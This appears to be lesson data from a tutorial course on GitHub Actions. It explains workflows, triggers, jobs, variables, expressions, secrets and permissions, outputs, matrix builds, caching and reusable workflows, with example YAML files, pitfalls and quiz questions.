tool.name: GitHub Actions
tool.tagline: CI/CD and automation built into GitHub, driven by YAML workflows
tool.description: GitHub Actions runs workflows defined as YAML files in your repository whenever something happens on GitHub: a push, a pull request, a schedule or a manual click. Teams use it to build and test every change, publish packages and deploy to the cloud. Because it lives next to the code and has a huge marketplace of reusable actions, it is the default CI/CD system for most projects hosted on GitHub.

glossary.def: In GitHub Actions, a text file in a repository's .github/workflows/ folder that says what to do automatically and when: which events start it and which jobs to run.
In GitHub Actions, a list of steps that run one after another on one runner. The jobs of a workflow run at the same time unless one is told to wait for another.
The computer that carries out a GitHub Actions job: usually a fresh virtual machine GitHub lends you for that one job, or a machine of your own.
A ready-made, reusable step for GitHub Actions workflows, such as actions/checkout, published in a repository and called from a step with uses:.
A pass or fail mark GitHub shows next to a commit or pull request, for example the result of a workflow run.
GitHub repository settings that guard a branch such as main, for example by requiring reviews or passing checks before anything can be merged into it.
A non-secret setting, such as a region name, saved in GitHub's repository or organization settings and read in workflows as vars.NAME.
A temporary password GitHub creates for each workflow job so its commands can act on the repository, such as pushing a commit. It stops working when the job ends.
A workflow that starts with on: workflow_call so other workflows can run it as one of their jobs, sharing one pipeline across many repositories.
A GitHub Actions action made of several ordinary steps listed in its action.yml, so a group of steps can be reused as one.
In GitHub, a named place you deploy to, such as staging or production, with its own secrets and rules like required approvals.
In GitHub Actions, a name shared by runs or jobs so that only one of them runs at a time, with at most one more waiting.
The rules on a cloud account saying who may borrow a role, for example only GitHub workflows from one repository and branch.
One fact written inside a signed token, such as which repository or branch the token was issued for.
A machine of your own that runs GitHub's runner program and takes GitHub Actions jobs, instead of a machine GitHub provides.
A runner that takes exactly one job and is then thrown away, so nothing left behind by one job can affect the next.
GitHub's add-on that creates GitHub Actions runners on Kubernetes when jobs arrive and removes them when they finish.
A widely used system that runs containers across a group of machines, starting, restarting and adding copies of them automatically.
GitHub's built-in bot that watches the versions of things your project uses and opens pull requests to update them.

concepts.name: What GitHub Actions is
concepts.summary: GitHub can do chores for your project automatically whenever something happens. Learn the words for its parts, from workflows to jobs.
concepts.why: You need these few words before any workflow file makes sense, and they tell you where each piece of work actually happens.
concepts.body:
Picture the chores that should follow every change to a project: check that it still works, tidy the files, publish a new version. People forget them, or do them differently each time. **GitHub Actions** is GitHub's built-in service for doing such chores automatically, on GitHub's own computers, whenever something happens in your repository.

The best-known use is checking each change. Programmers write **automated tests**: small programs that use the project and check it gives the right answers. Running the tests on every new commit, automatically, is called **continuous integration**, or **CI** for short.

CI also runs when someone opens a **pull request**: a proposal, made on GitHub, to merge the commits of one branch (often in a fork) into the main project, with a page where teammates review them first. The test result shows there as a green tick or a red cross.

You describe the automation in a **workflow**: a text file in the folder `.github/workflows/` of your repository, written in YAML, a simple settings format covered in the next lesson. A workflow says which **events** start it (a push, a new pull request, a set time each night, a button press) and what to do.

The work is split into **jobs**. Each job gets its own **runner**: a fresh computer that GitHub lends you for that one job and wipes afterwards. You choose Linux, Windows or macOS. Jobs run at the same time unless you say otherwise, and since each has its own runner, they don't see each other's files.

A runner is usually a **virtual machine**: a complete computer simulated in software, one of many sharing GitHub's big real machines. That is how every job gets a clean one within seconds.

A job is a list of **steps**, done in order on the same runner, so steps do share files. A step either runs a command, just like one you'd type in a terminal (`run:`), or uses an **action** (`uses:`): a ready-made step someone published for everyone to reuse. `actions/checkout`, for example, clones your repository onto the runner, which starts empty.

Every run is listed in your repository's **Actions** tab, with the text each step printed, called the **logs**. Public repositories use the standard runners for free; private ones get a monthly allowance of minutes.
concepts.code:
# .github/workflows/hello.yml
name: Hello              # shown in the Actions tab
on: push                 # event: run after every push
jobs:
  greet:                 # a job, named greet
    runs-on: ubuntu-latest   # runner: a fresh Linux machine
    steps:
      - uses: actions/checkout@v7      # step using an action: copy the repository here
      - run: echo "Hello from $GITHUB_REPOSITORY"   # step running a command: echo prints text,
                                    # $GITHUB_REPOSITORY is filled in with the repository name
      - run: ls                         # lists the files checkout copied
takeaways: Workflows are files in .github/workflows/; an event such as a push starts them
A workflow has jobs; a job has steps; a step runs a command or an action
Each job gets a fresh runner; steps in one job share its files
pitfalls: Expecting two jobs to see each other's files: each runs on its own machine.

quiz.q: Two steps in the same job, and two jobs in the same workflow: which pair can see the same files?
quiz.explain: Steps run one after another on one runner; each job gets its own fresh runner.

concepts.name: Your first workflow file
concepts.summary: Write a CI workflow that checks out the code, installs dependencies and runs the tests on every push and pull request.
concepts.why: A build-and-test workflow on every change is the single most valuable thing Actions does for a project.
concepts.body:
Workflow files are written in **YAML**, a text format for settings. Each line is a `name: value` pair, and indenting lines with spaces (never tabs) puts them inside the line above, like sub-points in an outline. A line starting with `- ` is one item of a list, and `#` starts a comment: a note for people that GitHub ignores.

Three names sit at the left edge of every workflow file: `name` (an optional label), `on` (the events that start it) and `jobs`. Each job needs `runs-on`, which picks the runner, and a list of `steps`.

A typical CI job follows the same recipe whatever language the project's code is written in:

- `actions/checkout` copies the commit being tested onto the runner, which starts empty.
- A `setup-*` action, such as `actions/setup-node` or `actions/setup-python`, installs the language and its tools in the version you ask for. Its settings go under `with:`.
- `run:` steps install the project's dependencies, run a **linter** (a tool that reads the code and points out likely mistakes and messy style), then run the tests.

Each `run:` step is handed to a **shell**: the program that reads commands and carries them out, the same thing that reads what you type in a terminal. On Linux and macOS runners it is `bash`; on Windows it is PowerShell. To put several commands in one step, write `run: |` and then each command on its own indented line.

Every command reports a number when it finishes, its **exit code**: 0 means it worked, anything else means it failed. On Linux and macOS the first failing command stops the step. A failed step fails the job, marks the run red and, by default, skips the remaining steps.

Commit the file and push: the run appears under the **Actions** tab within seconds. With `on: [push, pull_request]`, the result also shows on each pull request as a **status check**, a pass or fail mark. A repository setting called **branch protection** can require that check to pass before anyone may merge.

Give steps a `name` for readable logs. Keep CI workflows fast and boring: the same commands a developer runs on their own computer, in the same order.
concepts.code:
name: CI
on: [push, pull_request]        # every push and every pull request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7       # copy the code onto the runner
      - uses: actions/setup-node@v7     # install Node.js, which runs JavaScript
        with:
          node-version: 22              # a setting for that action
      - name: Install
        run: npm ci                     # install the project's dependencies
      - name: Lint and test
        run: |                          # | = several commands, one per line
          npm run lint
          npm test
takeaways: Check out the code, set up the language, then run your commands
A command with a non-zero exit code fails the step and the job
Use run: | to put several commands in one step
pitfalls: Forgetting actions/checkout and wondering why the repository files are missing.

quiz.q: A run step contains three commands on separate lines and the second one fails. What happens on a Linux runner?
options: The step fails at the second command and later steps are skipped
All three run and the step passes
Only the last command's exit code counts
quiz.explain: On Linux the shell stops at the first failing command, so the step fails and, by default, the following steps are skipped.

concepts.name: Using actions from the Marketplace
concepts.summary: Call ready-made actions with uses:, give them settings with with:, and pin them to a version you trust.
concepts.why: Most workflow steps are someone else's action; knowing how to choose and pin them keeps builds stable and safe.
concepts.body:
An **action** is a reusable step that someone published in a GitHub repository. You call it as `owner/repo@version`, for example `actions/checkout@v7`: the account, the repository, and after the `@` which version to use. GitHub downloads it when the job starts. Thousands are listed on the GitHub Marketplace, GitHub's searchable catalogue of actions.

The version after `@` can be a branch, a tag or a commit ID. A **tag** is a name, such as `v5` or `v5.0.0`, that the author attaches to one particular commit, usually to mark a release.

- A short tag like `v5` is moved by the author to each new compatible release, so you get fixes automatically.
- An exact tag like `v5.0.0` normally stays put, but its owner *can* still move it.
- A full 40-character commit ID can never change, because it is calculated from the code itself.

Settings for the action go under `with:`. Each action lists the settings it accepts in its `action.yml` file and its **README**, the description shown on its repository's front page. Some actions also produce **outputs**, values that later steps can read. An action stored in your own repository is called by its folder: `uses: ./.github/actions/setup`.

`actions/checkout` deserves a closer look. By default it fetches only the one commit being tested (`fetch-depth: 1`). That is fast, but commands that look at history, such as `git describe` (which names a commit after the nearest tag), find none. Set `fetch-depth: 0` to get the full history.

Checkout also leaves a sign-in behind. GitHub gives every job a **token**, a temporary password that lets the job act on your repository. Checkout saves it so later steps can run commands like `git push` without being asked for a password. If no later step needs that, set `persist-credentials: false` so it isn't left lying around.

Actions under `actions/` are made by GitHub. For **third-party** actions, written by anyone else, check the code, who maintains it and how widely it is used: an action runs with access to your files and to any secrets you pass it.
concepts.code:
steps:
  - uses: actions/checkout@v7
    with:
      fetch-depth: 0              # full history, so git describe can find tags
      persist-credentials: false  # don't keep the token for later steps
  - run: git describe --tags --always   # e.g. v1.4.2-3-g1a2b3c4 (3 commits after v1.4.2)
  - uses: actions/setup-python@v7
    with:
      python-version: "3.13"      # quoted: see the pitfall
  # someone else's action, pinned to a full commit ID (the comment records its tag)
  - uses: owner/some-action@0123456789abcdef0123456789abcdef01234567 # v2.1.0
takeaways: uses: owner/repo@version runs an action; with: gives it settings
Short version tags update themselves; a full commit ID pins exactly
checkout fetches one commit unless fetch-depth: 0
pitfalls: Leaving version numbers unquoted: YAML reads python-version: 3.10 as the number 3.1, so write "3.10".

quiz.q: Which reference guarantees the action code cannot change under you?
quiz.explain: Branches and tags can be moved to other commits; a commit ID is calculated from the content, so it can't change.

concepts.name: Triggers: push, pull_request, schedule, manual
concepts.summary: Control when a workflow runs: filter pushes and pull requests by branch and file, run on a timetable, or add a manual Run button.
concepts.why: Running the right workflow at the right time saves minutes and stops a release going out from the wrong branch.
concepts.body:
The `on` section lists the events that start a workflow. Each event can have filters that narrow it down.

`push` and `pull_request` accept `branches`, `tags` (release names such as `v1.2` attached to a commit) and `paths` filters, plus `-ignore` versions such as `paths-ignore` that exclude instead. With `paths`, the workflow runs only when a matching file changed. For pull requests the branch filter matches the **target** branch, the one the changes would be merged into, so `branches: [main]` means "pull requests into main".

Filters use **glob patterns**, simple wildcards for names: `*` matches any characters except `/`, and `**` matches anything including `/`, so `src/**` means everything inside the `src` folder. When both `branches` and `paths` are given, both must match.

`pull_request` also has activity `types`. The default is `opened`, `synchronize` (new commits pushed to it) and `reopened`; others, such as `labeled` (a label was added), must be asked for.

`schedule` runs a workflow on a timetable written as a **cron** line: five parts for minute, hour, day of month, month and day of week, where `*` means "any". `30 2 * * 1` is 02:30 every Monday. Times are in **UTC**, the world's standard clock, not your local time. The shortest interval is every 5 minutes, only the copy of the file on the repository's main (default) branch counts, and runs can start late when GitHub is busy.

`workflow_dispatch` adds a **Run workflow** button to the Actions tab. You can declare `inputs`, small boxes on a form the person fills in first, and read them as `inputs.name`. The same run can be started from a terminal with GitHub's `gh` program.

Other events include `release` (a release is published), `workflow_run` (another workflow finished) and `issues` (someone opens or edits an issue, GitHub's list of bug reports and to-dos). `repository_dispatch` lets an outside service start a workflow by sending GitHub a message.

Two pull-request details matter. The run tests a temporary **merge commit**, GitHub's preview of the target branch after merging, so tests check the combined result. And pull requests from forks get no secrets and only read access, so a stranger's changes can't steal your passwords.
concepts.code:
on:
  push:
    branches: [main, "release/**"]
    paths: ["src/**", "package.json"]   # only when these files change
  pull_request:
    branches: [main]          # pull requests targeting main
  schedule:
    - cron: "30 2 * * 1"      # minute 30, hour 2, any day, any month, Monday (UTC)
  workflow_dispatch:          # manual Run workflow button
    inputs:
      environment:
        type: choice
        options: [staging, production]
        default: staging
jobs:
  show:
    runs-on: ubuntu-latest
    steps:
      # ${{ }} inserts a value from GitHub; covered in a later lesson
      - run: echo "event=${{ github.event_name }} env=${{ inputs.environment }}"
takeaways: push and pull_request can be filtered by branch and by changed files
Schedules are cron lines in UTC and use the default branch's copy
workflow_dispatch adds a manual Run button with input fields
pitfalls: Expecting a schedule in a feature branch's workflow file to run: only the default branch's copy is used.

quiz.q: With on: pull_request: branches: [main], which PRs trigger the workflow?
options: PRs whose head branch is named main
quiz.explain: For pull_request events, the branches filter matches the base (target) branch.

concepts.name: Multiple jobs and needs
concepts.summary: Split a workflow into jobs that run side by side, and use needs to make one job wait for others.
concepts.why: Real projects lint, test and then deploy (put the new version live for its users) in separate jobs; needs says what waits for what.
concepts.body:
Jobs in a workflow start **at the same time**, each on its own runner. To make one wait, list the jobs it depends on under `needs`. It then starts only when all of those jobs have succeeded; if one of them fails, the waiting job is **skipped**.

```yaml
deploy:
  needs: [lint, test]
```

Chained like this, jobs form a **pipeline**: an assembly line where each stage starts once the earlier ones are done, such as check, then test, then deploy. The run page draws it as a diagram, so a clear structure doubles as documentation: quick checks first, slow or risky jobs only after them.

Because each job has its own fresh runner, nothing one job saves is visible to the next. Anything a later job needs must be handed over: files as **artifacts** (files a job saves with the run, such as a built app or a test report), small values as job outputs. Both come later. Each job also checks out the code again.

Useful job settings:

- `runs-on`: different jobs can use different systems, say one Linux and one Windows.
- `timeout-minutes`: how long the job may run before GitHub stops it. The default is 360 minutes (6 hours), far too long for most jobs.
- `if:`: skip the job unless a condition holds, for example deploy only from `main`.
- `continue-on-error: true`: let the run pass even if this job fails, handy for experimental checks.

On Linux runners, jobs can also use **containers**: sealed-off bundles holding a program plus everything it needs, which start in seconds. `container:` runs the whole job inside one, and `services:` starts extra ones beside it, typically a **database** (an organised store of data, such as PostgreSQL) for the tests to use.
concepts.code:
jobs:
  lint:
    runs-on: ubuntu-latest
    steps: [{uses: actions/checkout@v7}, {run: make lint}]   # two steps on one line; make runs a named task
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15        # stop after 15 minutes
    services:
      postgres:                # a PostgreSQL database container for the tests
        image: postgres:17
        env: {POSTGRES_PASSWORD: pw}
        ports: ["5432:5432"]
    steps: [{uses: actions/checkout@v7}, {run: make test}]
  deploy:
    needs: [lint, test]        # waits for both; skipped if either fails
    if: github.ref == 'refs/heads/main'   # only on the main branch
    runs-on: ubuntu-latest
    steps: [{run: echo deploying}]
takeaways: Jobs run at the same time unless needs orders them
If a job it needs fails, the waiting job is skipped
Set `timeout-minutes`; the default limit is 6 hours
pitfalls: Saving files in one job and expecting the next job to find them: it runs on a different machine.

quiz.q: Job C has needs: [A, B]. A succeeds, B fails. What happens to C?
options: C waits until B is re-run
quiz.explain: By default a job only runs when all of its needs succeeded.

concepts.name: Environment and configuration variables
concepts.summary: Give steps settings through env at three levels, read the values GitHub fills in, and keep non-secret settings as configuration variables.
concepts.why: Almost every workflow needs settings and facts about the run, like the branch or commit, and env is how commands receive them.
concepts.body:
A **variable** is a named value, like a labelled box: `STAGE` might hold `test`. An **environment variable** is one handed to every program a step starts, so any command can look it up by name. In a `run:` command you read it with a dollar sign: `$STAGE`.

The `env` section sets environment variables at three levels: the whole workflow, one job, or one step. If a name is set at two levels, the narrower one wins: a step's value beats its job's, and a job's beats the workflow's.

GitHub also fills in **default variables** on every runner, including:

- `GITHUB_SHA`: the ID of the commit being tested.
- `GITHUB_REF` and `GITHUB_REF_NAME`: the full and short name of the branch, e.g. `refs/heads/main` and `main`.
- `GITHUB_REPOSITORY`, `GITHUB_RUN_ID`, `GITHUB_WORKSPACE` (the folder the code is checked out into), `RUNNER_OS` (Linux, Windows or macOS).
- `CI=true`, which many tools check so they don't stop to ask questions.

There are two ways to insert a value. `$GITHUB_SHA` is replaced by the shell, on the runner, while the command runs. `${{ github.sha }}` is an **expression**: GitHub replaces it in the workflow text itself, before the step starts. Expressions are the only option where no shell is involved, such as an action's `with:` settings and `if:` conditions.

For settings that differ between repositories but aren't secret, such as a region or an app name, use **configuration variables**. Create them on GitHub under Settings, Secrets and variables, Actions, Variables, and read them as `${{ vars.NAME }}`. They can be set for an organization, a repository or an environment (a target such as a test or live copy, covered later). Anything sensitive, like a password, belongs in secrets instead.
concepts.code:
env:                        # whole workflow
  APP: shop
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      STAGE: test             # this job
    steps:
      - run: echo "$APP $STAGE on $GITHUB_REF_NAME at ${GITHUB_SHA::7}"
        # prints: shop test on main at 1a2b3c4  (::7 = first 7 characters)
      - run: echo "$STAGE"    # prints: prod (the step's value wins)
        env:
          STAGE: prod
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ vars.NODE_VERSION }}   # a configuration variable
takeaways: env works at workflow, job or step level; the narrowest wins
$NAME is filled in by the shell, ${{ }} by GitHub before the step runs
vars.* holds non-secret settings; secrets.* holds sensitive ones
pitfalls: Using $NAME inside a with: setting: no shell reads it there, so the action receives the text $NAME itself.

quiz.q: Where must you use ${{ env.X }} instead of $X?
options: In a with: input of an action
quiz.explain: with: values are not read by a shell, so only the ${{ }} form gets filled in.

concepts.name: Expressions, contexts and if conditions
concepts.summary: Use ${{ }} expressions to read facts about the run, and if conditions with functions like failure() to decide what runs.
concepts.why: Conditions are how one workflow behaves differently for pull requests, branches and failures.
concepts.body:
An expression `${{ ... }}` is worked out by GitHub, not by the shell. It can read **contexts**: bundles of named facts about the run, read with dots, like `github.ref`.

- `github`: the event name, the branch or tag (`ref`), the commit (`sha`), who started it (`actor`), the repository, and in `github.event` everything GitHub sent about the event, such as a pull request's title.
- `env`, `vars`, `secrets`, `inputs`: values you defined.
- `steps.<id>.outputs` and `steps.<id>.outcome`: results of earlier steps (give the step an `id`).
- `needs.<job>.outputs` and `needs.<job>.result`: results of jobs listed in `needs`.
- `matrix`, `runner`, `job`: covered where they are used.

Expressions support comparisons (`==`, `!=`), `&&` (and), `||` (or), `!` (not) and **functions**: built-in helpers you call with values in brackets, such as `contains()`, `startsWith()`, `format()`, `join()`, `toJSON()`, `fromJSON()` and `hashFiles()`. Comparing text ignores upper and lower case: `'Main' == 'main'` is true.

In `if:` you may leave out the `${{ }}` wrapper. A step's `if` quietly includes `success()`, meaning "all previous steps succeeded". These status functions change that:

- `failure()`: run only if an earlier step failed (notifications, uploading logs).
- `always()`: run no matter what, even after the run was cancelled.
- `cancelled()`: run only when the run was cancelled.
- `!cancelled()`: run after success or failure but not cancellation; usually better than `always()` for clean-up.

To see what a context holds, print it with `echo '${{ toJSON(github.event) }}'`, but never do this with `secrets`.
concepts.code:
steps:
  - id: tests
    run: npm test
  - if: failure() && steps.tests.outcome == 'failure'   # only after the tests failed
    run: echo "Tests failed on ${{ github.ref_name }}"
  - if: github.event_name == 'pull_request' && contains(github.event.pull_request.labels.*.name, 'preview')
    run: echo "Building preview for PR ${{ github.event.number }}"
  - if: ${{ !cancelled() }}                              # success or failure, not cancel
    run: echo "always tidy up (unless cancelled)"
  - if: startsWith(github.ref, 'refs/tags/v')           # a tag such as v1.2.0
    run: echo "release ${{ github.ref_name }}"
takeaways: Contexts give you the event, earlier steps, needed jobs and your own values
if: implies success() unless you use a status function
Prefer !cancelled() to always() for clean-up steps
pitfalls: Writing if: ! startsWith(...) without ${{ }}: a leading ! means something special in YAML, so wrap the condition in ${{ }}.

quiz.q: A step has if: github.ref == 'refs/heads/main'. An earlier step failed. Does it run?
options: No, because success() is implied and an earlier step failed
Yes, the condition is true on main
Only if continue-on-error is set on the job
It runs but is marked skipped
quiz.explain: Unless a status function is used, success() is added implicitly to every if condition.

concepts.name: Secrets, GITHUB_TOKEN and permissions
concepts.summary: Store passwords and keys as encrypted secrets, use the automatic GITHUB_TOKEN, and limit what it may do.
concepts.why: Deploying or publishing needs credentials, and leaking them or granting too much is the biggest security risk in CI.
concepts.body:
**Secrets** hold **credentials**: passwords, keys and other proof of identity for services your workflow uses. GitHub keeps them **encrypted**, scrambled so only GitHub can read them back, at organization, repository or environment level. Read them as `${{ secrets.NAME }}` and hand them to steps through `env` or `with`.

GitHub hides secret values in the logs, printing `***` wherever one appears exactly. It can't spot a secret that was changed on the way, for example re-encoded or cut into pieces, so never print secrets at all.

Every job also gets a **GITHUB_TOKEN**: a **token** (a temporary password) created for that job, which stops working when the job ends. Commands use it to **authenticate**, to prove who they are, to GitHub for the current repository: `git push`, GitHub's `gh` program, or GitHub's **API**, the way programs rather than people talk to GitHub. Use it as `${{ secrets.GITHUB_TOKEN }}` or `${{ github.token }}`.

What the token may do is set by `permissions`, for the workflow or one job. Each permission covers one area, such as `contents` (the code) or `pull-requests`, and is `read`, `write` or `none`. Once you write a `permissions` block, every area you don't list becomes `none`. Best practice: start from `contents: read` and grant each job only what it needs, such as `pull-requests: write` to comment on pull requests or `packages: write` to publish packages to GitHub. New repositories default to a read-only token.

Security rules worth remembering:

- Pull requests from forks get no secrets and a read-only token.
- Things done with the GITHUB_TOKEN, such as pushing a commit, don't start new workflow runs. That prevents endless chains where each run's push starts the next. If you really need it, use a token from a GitHub App (an automation account installed on the repository).
- Secrets can't be tested directly in `if:` conditions; copy one into `env` and test that.
concepts.code:
permissions:
  contents: read              # default for every job in this workflow
jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write    # only this job may write to PRs
    steps:
      - run: gh pr comment "$PR" --body "Build passed"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR: ${{ github.event.pull_request.html_url }}
      - run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.DEPLOY_API_KEY }}   # shown as *** if printed
takeaways: secrets.* are encrypted, hidden in logs and withheld from fork pull requests
GITHUB_TOKEN is per job and short-lived; limit it with permissions
Listing any permissions sets every unlisted one to none
pitfalls: Relying on the *** hiding: a re-encoded or partial secret is printed in clear text.

quiz.q: Your workflow pushes a commit using GITHUB_TOKEN. Will that push trigger your on: push workflows?
options: Only if the workflow has permissions: write-all
No, events made with GITHUB_TOKEN don't start new runs
quiz.explain: GitHub suppresses workflow triggers from GITHUB_TOKEN actions to avoid recursive runs.

concepts.name: Step outputs, job outputs and summaries
concepts.summary: Pass values between steps with GITHUB_OUTPUT and GITHUB_ENV, between jobs with job outputs, and write a run summary.
concepts.why: Workflows constantly need to hand a computed version number or a file's location to the next step or job.
concepts.body:
Steps hand values on by adding lines to special files. GitHub puts each file's location in an environment variable:

- `GITHUB_OUTPUT`: `echo "name=value" >> "$GITHUB_OUTPUT"` sets an output of the current step, read later as `steps.<id>.outputs.name`.
- `GITHUB_ENV`: `echo "NAME=value" >> "$GITHUB_ENV"` makes `NAME` an environment variable for all **following** steps of the job (not the current one).
- `GITHUB_PATH`: add a folder to `PATH`, the list of folders the shell searches for programs, for later steps.
- `GITHUB_STEP_SUMMARY`: text written here appears on the run's summary page, formatted as **Markdown** (ordinary text with simple marks, such as `#` for a heading); great for test reports.

In these commands `echo` prints text and `>>` adds that text to the end of a file, so each step appends its own lines.

To pass a value to another job, declare it under the job's `outputs`, taking it from a step output, then read it in the waiting job as `needs.<job>.outputs.<name>`. Job outputs are always text, at most 1 MB per job; use artifacts for files.

A value that spans several lines needs a marker word around it, so GitHub knows where it ends:

```bash
{ echo "notes<<EOF"; cat notes.txt; echo "EOF"; } >> "$GITHUB_OUTPUT"
```

The old `::set-output` command is **deprecated**: it may still work but is due to be removed, so always use the files above. Outputs that contain secrets are hidden and may be dropped when passed between jobs.
concepts.code:
jobs:
  version:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.v.outputs.tag }}      # expose step output as job output
    steps:
      - id: v
        run: echo "tag=v1.$GITHUB_RUN_NUMBER" >> "$GITHUB_OUTPUT"
      - run: echo "BUILT_AT=$(date -u +%F)" >> "$GITHUB_ENV"
      - run: echo "### Built ${{ steps.v.outputs.tag }} on $BUILT_AT" >> "$GITHUB_STEP_SUMMARY"
  publish:
    needs: version
    runs-on: ubuntu-latest
    steps:
      - run: echo "Publishing ${{ needs.version.outputs.tag }}"   # Publishing v1.42
takeaways: Step output: append name=value to $GITHUB_OUTPUT
GITHUB_ENV affects later steps only
Cross-job values go through job outputs and needs.<job>.outputs
pitfalls: Reading a GITHUB_ENV variable in the same step that set it: it is only visible from the next step.

quiz.q: How does job B read output tag set by a step in job A?
options: needs.A.outputs.tag, after A maps it under outputs:
quiz.explain: Job A must declare the job output, and B must list A in needs.

concepts.name: Matrix builds
concepts.summary: Run one job definition across many combinations of operating system, language version and settings with strategy.matrix.
concepts.why: Testing every supported system and version by hand is impossible; a matrix does it all at once from a few lines.
concepts.body:
Projects often must work on several **operating systems** (Linux, Windows, macOS) and several versions of their language. `strategy.matrix` turns one job into many to test them all. Under it, each name holds a list of values, and GitHub creates one job per combination, all running at the same time. Inside the job you read the current values as `${{ matrix.<name> }}`.

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest, macos-latest]
    node: [22, 24]
```

That is 3 x 2 = 6 jobs. To adjust the set:

- `include`: add extra combinations, or add values to matching ones (for example an `experimental: true` flag).
- `exclude`: drop specific combinations.
- `fail-fast` (default `true`): cancel the other matrix jobs when one fails. Set `false` to see every failure.
- `max-parallel`: limit how many run at once.

A matrix can create up to 256 jobs per workflow run. Put matrix values in the job's name, `name: test (${{ matrix.os }}, node ${{ matrix.node }})`, so failures are easy to read. If branch protection requires a check, it must list the exact job names the matrix produces.

The matrix can also be worked out while the workflow runs. One job produces a list in **JSON**, a text format for lists and named values such as `["web", "api"]`, and passes it as an output; the next uses `matrix: ${{ fromJSON(needs.plan.outputs.targets) }}`. In a repository that holds several projects, this is how you test only the projects that changed.
concepts.code:
jobs:
  test:
    name: test (${{ matrix.os }}, py ${{ matrix.python }})
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
        python: ["3.13", "3.14"]
        exclude:
          - os: macos-latest
            python: "3.13"
        include:
          - os: ubuntu-latest
            python: "3.15"
            experimental: true
    continue-on-error: ${{ matrix.experimental == true }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-python@v7
        with: {python-version: "${{ matrix.python }}"}
      - run: python -m pytest       # 4 jobs in total
takeaways: Each matrix combination is a separate job, and they all run at once
include adds or extends combinations; exclude removes them
fail-fast: false shows every failing combination
pitfalls: Unquoted versions like 3.10 become the number 3.1 in YAML.

quiz.q: matrix: os: [a, b], v: [1, 2, 3] with exclude of one combination. How many jobs run?
quiz.explain: 2 x 3 = 6 combinations, minus one excluded, gives 5 jobs.

concepts.name: Caching dependencies and sharing artifacts
concepts.summary: Speed up runs by caching downloaded dependencies, and hand files between jobs or to people with artifacts.
concepts.why: Caching often halves CI time, and artifacts are the only way to pass build results between jobs.
concepts.body:
**Caches** and **artifacts** both store files, for different purposes.

A **cache** is a speed-up: a saved copy of files that could be recreated if missing, typically downloaded dependencies. `actions/cache` saves a folder under a `key` at the end of a job and restores it at the start of later runs. Build the key from a hash of the **lock file**, the file that records the exact version of every dependency, as in `${{ runner.os }}-npm-${{ hashFiles('package-lock.json') }}`, so the key changes when dependencies change. `restore-keys` lists key beginnings to fall back on when there is no exact match. Easier still, most `setup-*` actions have a built-in `cache:` setting. A cache belongs to a branch (with the default branch's caches as fallback), is deleted after 7 days unused, and the total per repository is limited.

An **artifact** is an output: build results, test reports, coverage. `actions/upload-artifact` stores files with the run; `actions/download-artifact` fetches them in a later job of the same run, and people can download them from the run page. Set `retention-days` to control storage costs. Since v4, artifact names must be unique within a run, so jobs created from one matrix (see Matrix builds) should put their matrix values in the name.

Rule of thumb: if losing it only makes the run slower, it's a cache; if a later job or a person needs it, it's an artifact.
concepts.code:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with: {node-version: 22, cache: npm}   # caches ~/.npm by lockfile hash
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v7
        with:
          name: dist
          path: dist/
          retention-days: 5
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v8
        with: {name: dist, path: dist}
      - run: ls dist          # index.html assets/ ...
takeaways: Cache = recreatable dependencies keyed by a lockfile hash
Artifact = outputs passed to later jobs or people
setup-* actions have a built-in cache input
pitfalls: Caching the installed node_modules folder instead of npm's download cache; it breaks when the Node version changes.

quiz.q: Which belongs in an artifact rather than a cache?
options: Compiled binaries the deploy job must ship
quiz.explain: Build outputs needed by another job must be passed as artifacts; caches may be evicted at any time.

concepts.name: Reusable workflows
concepts.summary: Share whole multi-job workflows across repositories with workflow_call, typed inputs, secrets and outputs.
concepts.why: Organizations with dozens of repositories need one maintained CI definition instead of copy-pasted workflow files.
concepts.body:
A **reusable workflow** is an ordinary workflow file whose trigger is `on: workflow_call`. Another workflow calls it from a **job**, not from a step:

```yaml
jobs:
  ci:
    uses: my-org/ci-templates/.github/workflows/node.yml@v3
    with: {node-version: 22}
    secrets: inherit
```

The called workflow declares its `inputs` with types (`string` for text, `number`, or `boolean` for true/false), the `secrets` it expects, and `outputs` taken from its own jobs. The caller passes secrets one by one or with `secrets: inherit`, which forwards all of its secrets.

Things to know:

- The called workflow's jobs appear in the caller's run, named `caller-job / called-job`.
- Calls can nest up to ten levels deep, and one run can involve at most 50 different reusable workflows.
- `env` values from the caller are **not** passed along; use inputs.
- The called workflow can only reduce the `GITHUB_TOKEN` permissions, never raise them.
- Pin a version with `@tag` or `@<commit ID>`, like actions; a workflow in the same repository can be called as `./.github/workflows/x.yml`.

Reusable workflows vs **composite actions** (actions made of several steps, covered in Writing custom actions): a reusable workflow contains whole jobs with their own runners, environments and secrets; a composite action bundles steps that run inside one job. Use the workflow for "our standard CI pipeline", the action for "set up our tools".
concepts.code:
# .github/workflows/build.yml in my-org/ci-templates
on:
  workflow_call:
    inputs:
      node-version: {type: string, default: "22"}
    secrets:
      NPM_TOKEN: {required: false}
    outputs:
      artifact: {value: "${{ jobs.build.outputs.name }}"}
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      name: ${{ steps.n.outputs.name }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with: {node-version: "${{ inputs.node-version }}"}
      - run: npm ci && npm test
        env: {NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}"}
      - id: n
        run: echo "name=build-${{ github.sha }}" >> "$GITHUB_OUTPUT"
takeaways: on: workflow_call makes a workflow callable from a job
Inputs, secrets and outputs are the only ways values go in and out
Reusable workflow = whole jobs; composite action = steps
pitfalls: Expecting the caller's env values to reach the reusable workflow; pass them as inputs.

